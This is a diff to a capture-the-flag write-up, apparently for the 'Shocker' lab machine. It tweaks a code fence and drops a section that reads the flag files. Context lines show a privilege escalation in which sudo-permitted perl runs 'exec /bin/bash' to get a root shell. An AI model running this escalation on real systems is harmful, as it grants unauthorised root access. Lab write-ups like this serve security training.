@@ -128,7 +128,7 @@ First thing to check on any Linux box:
 ```bash
 sudo -l
 ```
-```
+```bash
 User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
@@ -154,14 +154,6 @@ sudo /usr/bin/perl -e 'exec "/bin/bash";'
 ```bash
 whoami
 root
-```
-
----
-
-## Flags
-```bash
-cat /home/shelly/user.txt
-cat /root/root.txt
 ```
 
 ---
